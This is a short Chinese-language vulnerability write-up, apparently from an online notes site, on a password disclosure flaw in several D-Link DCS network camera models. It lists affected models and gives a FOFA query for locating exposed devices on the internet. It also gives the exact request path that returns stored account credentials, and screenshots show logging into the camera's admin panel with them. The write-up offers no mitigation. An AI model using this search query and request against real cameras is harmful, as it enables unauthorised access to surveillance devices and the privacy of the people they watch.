# D-Link DCS监控系统getuser存在密码泄露漏洞

# 一、漏洞简介
D-Link DCS是一款监控摄像机，成像色彩为彩色 是一款网络摄像机，该监控存在账号密码信息泄露漏洞，恶意攻击者可通过访问特定的URL可以得到账号密码信息，直接进入利用漏洞得到账户密码直接进入后台。

# 二、影响版本
+ DCS-2530L
+ DCS-2670L
+ DCS-4603
+ DCS-4622
+ DCS-4701E
+ DCS-4703E
+ DCS-4705E
+ DCS-4802E
+ DCS-P703

# 三、资产测绘
+ fofa`app="D_Link-DCS-4622"`
+ 特征

![1708141509981-1360206a-2ef6-4c37-a777-af8adb962b91.png](./img/pO0XCtTI1eANRyj0/1708141509981-1360206a-2ef6-4c37-a777-af8adb962b91-700650.png)

# 四、漏洞复现
```java
/config/getuser?index=0
```

![1708141554778-102e598d-4d56-43d1-baf4-6d1c6c1393cf.png](./img/pO0XCtTI1eANRyj0/1708141554778-102e598d-4d56-43d1-baf4-6d1c6c1393cf-090242.png)

使用获取到的账号密码登录

![1708141620644-665a2497-6af1-405f-b142-b2f83d7ef69c.png](./img/pO0XCtTI1eANRyj0/1708141620644-665a2497-6af1-405f-b142-b2f83d7ef69c-733347.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lv9ugvkave8utxf5>